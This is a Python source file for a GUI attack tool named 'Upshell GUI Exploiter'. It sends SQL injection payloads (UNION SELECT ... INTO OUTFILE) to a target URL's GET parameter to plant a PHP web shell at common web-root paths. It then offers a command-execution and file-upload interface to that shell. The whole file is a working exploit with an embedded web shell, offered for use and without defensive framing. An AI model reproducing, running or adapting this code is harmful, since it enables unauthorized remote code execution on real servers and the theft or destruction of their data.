"""
Upshell GUI Exploiter
Author: JayVillain
"""

import tkinter as tk
from tkinter import ttk, filedialog, scrolledtext, messagebox
import requests
from urllib.parse import urlparse, parse_qs, urlencode, urlunparse
import time

# ---------------- CONFIG ---------------- #
WEB_SHELL = '''<?php
if(isset($_REQUEST['cmd'])){
    echo "<pre>";
    system($_REQUEST['cmd']);
    echo "</pre>";
}
if(isset($_FILES['file'])){
    move_uploaded_file($_FILES['file']['tmp_name'], $_FILES['file']['name']);
    echo "File uploaded.";
}
?>'''
UPLOAD_PATHS = [
    "/var/www/html/shell.php",
    "/tmp/shell.php",
    "/srv/http/shell.php",
    "C:/xampp/htdocs/shell.php",
]
HEADERS = {"User-Agent": "Mozilla/5.0 (UpshellGUI)"}
RETRY_DELAY = 1  # seconds

# ---------------- UTILITY ---------------- #
def build_exploit_url(base_url: str, param: str, payload: str) -> str:
    parsed = urlparse(base_url)
    query = parse_qs(parsed.query)
    query[param] = payload
    new_query = urlencode(query, doseq=True)
    return urlunparse((parsed.scheme, parsed.netloc, parsed.path, '', new_query, ''))

# ---------------- CORE LOGIC ---------------- #
class UpshellExploit:
    def __init__(self, target_url: str):
        self.target_url = target_url
        self.param = self._extract_param()

    def _extract_param(self) -> str:
        parsed = urlparse(self.target_url)
        qs = parse_qs(parsed.query)
        if not qs:
            raise ValueError("Target URL must contain a GET parameter")
        return list(qs.keys())[0]

    def upload_shell(self) -> str:
        for path in UPLOAD_PATHS:
            payload = f"' UNION SELECT \"{WEB_SHELL}\" INTO OUTFILE '{path}'-- -"
            exploit_url = build_exploit_url(self.target_url, self.param, payload)
            try:
                requests.get(exploit_url, headers=HEADERS, timeout=10)
                shell_url = f"{urlparse(self.target_url).scheme}://{urlparse(self.target_url).netloc}{path}"
                time.sleep(RETRY_DELAY)
                check = requests.get(shell_url, headers=HEADERS, timeout=5)
                if check.status_code == 200 and "cmd" in check.text:
                    return shell_url
            except requests.RequestException:
                continue
        return ''

    def exec_cmd(self, shell_url: str, cmd: str) -> str:
        try:
            response = requests.get(shell_url, params={"cmd": cmd}, headers=HEADERS, timeout=10)
            return response.text
        except requests.RequestException as e:
            return f"Error executing command: {e}"

    def upload_file(self, shell_url: str, filepath: str) -> str:
        try:
            with open(filepath, 'rb') as f:
                files = {'file': (filepath.split('/')[-1], f)}
                response = requests.post(shell_url, files=files, headers=HEADERS, timeout=10)
            return response.text
        except Exception as e:
            return f"Error uploading file: {e}"

# ---------------- GUI ---------------- #
class UpshellGUI(tk.Tk):
    def __init__(self):
        super().__init__()
        self.title("Upshell GUI Exploiter")
        self.geometry("700x500")
        self.resizable(False, False)
        self._build_widgets()
        self.exploit = None
        self.shell_url = ''

    def _build_widgets(self):
        # URL input frame
        url_frame = ttk.LabelFrame(self, text="Target URL")
        url_frame.pack(fill='x', padx=10, pady=5)
        self.url_entry = ttk.Entry(url_frame)
        self.url_entry.pack(fill='x', padx=5, pady=5)
        ttk.Button(url_frame, text="Upload Shell", command=self._on_upload).pack(side='right', padx=5, pady=5)

        # Log output
        self.log = scrolledtext.ScrolledText(self, wrap='word', state='disabled')
        self.log.pack(fill='both', expand=True, padx=10, pady=5)

        # Command frame
        cmd_frame = ttk.LabelFrame(self, text="Shell Interaction")
        cmd_frame.pack(fill='x', padx=10, pady=5)
        self.cmd_entry = ttk.Entry(cmd_frame)
        self.cmd_entry.pack(side='left', fill='x', expand=True, padx=5, pady=5)
        ttk.Button(cmd_frame, text="Execute", command=self._on_exec).pack(side='left', padx=5)
        ttk.Button(cmd_frame, text="Upload File", command=self._on_file_upload).pack(side='left', padx=5)

    def _log(self, message: str):
        self.log.config(state='normal')
        self.log.insert('end', message + '\n')
        self.log.config(state='disabled')
        self.log.see('end')

    def _on_upload(self):
        url = self.url_entry.get().strip()
        if not url:
            messagebox.showwarning("Input Error", "Please enter a target URL.")
            return
        try:
            self.exploit = UpshellExploit(url)
            self._log(f"[*] Attempting to upload shell to {url}")
            shell = self.exploit.upload_shell()
            if shell:
                self.shell_url = shell
                self._log(f"[+] Shell active at: {shell}")
            else:
                self._log("[-] Failed to upload shell.")
        except ValueError as ve:
            messagebox.showerror("URL Error", str(ve))

    def _on_exec(self):
        cmd = self.cmd_entry.get().strip()
        if not cmd or not self.shell_url:
            return
        self._log(f"$ {cmd}")
        output = self.exploit.exec_cmd(self.shell_url, cmd)
        self._log(output)

    def _on_file_upload(self):
        if not self.shell_url:
            return
        filepath = filedialog.askopenfilename(title="Select file to upload")
        if not filepath:
            return
        self._log(f"[*] Uploading file: {filepath}")
        result = self.exploit.upload_file(self.shell_url, filepath)
        self._log(result)

if __name__ == '__main__':
    app = UpshellGUI()
    app.mainloop()
# -*- coding: utf-8 -*-